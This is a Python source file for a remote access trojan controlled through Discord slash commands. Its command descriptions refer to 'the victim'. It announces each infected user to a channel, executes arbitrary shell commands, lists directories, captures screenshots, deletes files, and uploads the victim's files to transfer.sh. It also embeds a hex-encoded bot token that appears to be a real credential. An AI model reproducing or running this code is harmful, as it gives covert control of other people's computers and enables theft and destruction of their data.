import os
import os.path
import time
from os.path import join, exists

import discord
import pyautogui
import requests
from discord import *
from discord.utils import get

global Token
Token = "\x4d\x54\x41\x78\x4e\x44\x63\x77\x4e\x7a\x51\x33\x4e\x6a\x67\x35\x4e\x54\x45\x78\x4e\x7a\x4d\x33\x4e\x41\x2e\x47\x53\x34\x57\x58\x50\x2e\x72\x41\x37\x62\x6d\x4a\x67\x4d\x6a\x52\x32\x78\x34\x70\x44\x35\x67\x30\x4d\x52\x69\x47\x72\x74\x73\x47\x74\x66\x6d\x2d\x63\x4b\x79\x63\x6e\x42\x46\x73"


class Control(discord.Client):
	def __init__(self):
		super().__init__(intents=discord.Intents.all())
		self.tree = app_commands.CommandTree(self)

	async def setup_hook(self):
		self.tree.copy_global_to(guild=discord.Object(id=984582818489331732))
		await self.tree.sync(guild=discord.Object(id=984582818489331732))


bot = Control()


@bot.event
async def on_ready():
	# print(f"logged in as [{bot.user}]")
	username = os.getenv("USERNAME")
	for guild in bot.guilds:
		channel = get(guild.text_channels, name="d")
		await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")


@bot.tree.command(name="cmd", description="execute command in cmd")
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message(f"executing command `{command}`...")
	x = os.popen(command).read()
	if x == "":
		await interaction.channel.send("Command doesn't return anything/isn't valid")
	else:
		await interaction.channel.send(f"command `{command}` returned:\n ```{x}```")

@bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
async def cmd(interaction: discord.Interaction, directory: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%USERNAME%", os.getenv("USERNAME"))
	await interaction.response.send_message(f"displaying `{directory}`...")
	await interaction.channel.send(f"{ListDir(directory)}")


@bot.tree.command(name="screenshot", description="get a screenshot of the victim")
async def scr(interaction: discord.Interaction):
	name, path = doScreenshot()
	await interaction.response.send_message(f"Screenshot taken, sending...")
	await interaction.channel.send(file=discord.File(path))
	print(path)
	os.remove(path)


@bot.tree.command(name="upload",
description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
async def scr(interaction: discord.Interaction, locinput: str):
	await interaction.response.send_message(f"searching for `{locinput}`...")
	await interaction.channel.send(transfer(locinput))


@bot.tree.command(name="delete", description="delete a file of the victim (use %user% instead of username)")
async def scr(interaction: discord.Interaction, locinput: str):
	await interaction.response.send_message(f"searching for `{locinput}`...")
	await interaction.channel.send(delete(locinput))


def delete(Filelocation: str):
	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
	if exists(Filelocation):
		os.remove(Filelocation)
		output = f"File `{Filelocation}` deleted"
	else:
		output = f"File `{Filelocation}` not found"
	return output


def transfer(Filelocation: str):
	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))

	if exists(Filelocation):
		fileToUpload = {"file": (Filelocation, open(Filelocation, mode='rb'))}
		r = requests.post("https://transfer.sh/", files=fileToUpload)
		output = r.text
	else:
		output = f"File {Filelocation} not found"
	return output


def doScreenshot():
	name = time.strftime("%Y%m%d-%H%M%S.jpg")
	path = join(os.getenv("TEMP"), name)
	img = pyautogui.screenshot(path)
	return name, path


def ListDir(directory):
	s = ""
	dirToList = directory
	if exists(dirToList):
		ListedDir = os.listdir(dirToList)
		for i in ListedDir:
			# s += i + "\n"
			s += f" -> `{i}`\n"
	else:
		s = f"Directory `{dirToList}` not found"

	return s


bot.run(token=Token)
